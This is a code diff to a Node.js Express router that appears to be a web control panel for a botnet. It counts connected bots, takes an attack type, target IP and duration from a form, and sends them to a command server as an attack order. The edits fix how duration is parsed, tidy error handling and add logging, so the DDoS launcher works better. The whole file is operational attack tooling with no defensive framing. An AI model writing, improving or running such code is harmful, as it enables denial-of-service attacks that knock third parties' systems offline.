@@ -29,7 +29,11 @@ router.get('/', function (req, res, next) {
 router.get('/main', function (req, res, next) {
     console.log(botsNumber);
     connecting = false;
-    res.render('main', {botsNumber: botsNumber});
+    if(!client) {
+        res.redirect('/');
+    } else {
+        res.render('main', {botsNumber: botsNumber});
+    }
 });
 
 router.get('/err', function (req, res, next) {
@@ -56,7 +60,7 @@ router.get('/connect', function (req, res, next) {
                 console.log(botsConnected);
             }
             if(data.includes(" before sending another attack")) {
-                const attackError = stripAnsi(data.toString());
+                const attackError = (stripAnsi(data.toString()).split('\r\n')).filter(line => line.includes(" before sending another attack"))[0];
                 console.log(attackError);
                 eventEmitter.emit('failure', attackError);
             }
@@ -98,13 +102,19 @@ router.post('/attack', function (req, res) {
     console.log(req.body);
     let responseSent = false;
     const attackSuccessListener = function attackSuccessListener() {
-        responseSent = true;
-        res.status(200).send("Attack started!");
-        eventEmitter.removeListener('attack', attackSuccessListener);
-        eventEmitter.removeListener('failure', attackFailureListener);
+        setTimeout(function () {
+            // timeout after 2 seconds for error
+            if (!responseSent) {
+                responseSent = true;
+                res.status(200).send("Attack started!");
+                eventEmitter.removeListener('attack', attackSuccessListener);
+                eventEmitter.removeListener('failure', attackFailureListener);
+            }
+        }, 2000);
     }
     const attackFailureListener = function attackFailureListener(msg) {
         responseSent = true;
+        console.log("Failure!");
         res.status(501).send(msg);
 
         eventEmitter.removeListener('attack', attackSuccessListener);
@@ -113,8 +123,9 @@ router.post('/attack', function (req, res) {
     eventEmitter.addListener('attack', attackSuccessListener);
     eventEmitter.addListener('failure', attackFailureListener);
     const timeSplitted = req.body.attackDuration.split(':');
-    const attackDuration = timeSplitted[0] * 60 +  timeSplitted[1];
-    console.log(client._connected);
+    const attackDuration = parseInt(timeSplitted[0], 10) * 60 +  parseInt(timeSplitted[1], 10);
+    console.log(client);
+    console.log(`${req.body.attackType} ${req.body.targetIP} ${attackDuration}\n`);
     client.write(`${req.body.attackType} ${req.body.targetIP} ${attackDuration}\n`);
     setTimeout(function () {
             // timeout after 15 seconds
